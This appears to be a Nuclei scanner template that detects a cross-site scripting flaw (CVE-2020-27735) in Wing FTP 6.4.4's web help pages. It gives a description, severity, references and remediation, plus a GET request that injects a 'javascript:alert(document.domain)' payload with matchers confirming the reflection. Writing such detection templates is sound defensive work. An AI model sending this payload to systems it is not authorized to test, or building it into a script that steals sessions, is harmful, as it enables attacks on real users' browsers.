id: CVE-2020-27735

info:
  name: Wing FTP 6.4.4 - Cross-Site Scripting
  author: pikpikcu
  severity: medium
  description: |
    Wing FTP 6.4.4 is vulnerable to cross-site scripting via its web interface because an arbitrary IFRAME element can be included in the help pages via a crafted link, leading to the execution of (sandboxed) arbitrary HTML and JavaScript in the user's browser.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the victim's browser, leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Upgrade to the latest version of Wing FTP server or apply the vendor-provided patch to mitigate this vulnerability.
  reference:
    - https://www.wftpserver.com/serverhistory.htm
    - https://wshenk.blogspot.com/2021/01/xss-in-wing-ftps-web-interface-cve-2020.html
    - https://nvd.nist.gov/vuln/detail/CVE-2020-27735
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-27735
    cwe-id: CWE-79
    epss-score: 0.37
    epss-percentile: 0.97457
    cpe: cpe:2.3:a:wftpserver:wing_ftp_server:6.4.4:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: wftpserver
    product: wing_ftp_server
  tags: cve,cve2020,xss,wing-ftp,wftpserver

http:
  - method: GET
    path:
      - "{{BaseURL}}/help/english/index.html?javascript:alert(document.domain)"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<frame name="hmcontent" src="javascript:alert(document.domain)" title="Content frame">'

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 4a0a0047304502204d2a4bab6c0b63f4c70316a050440735922a6e5ed6ef4dbf14c0fb344052574b0221008e48a561595c5640f035f6cd2acd0d8c5bff3d09c68af23625cf90b76c960d7f:922c64590222798bb761d5b6d8e72950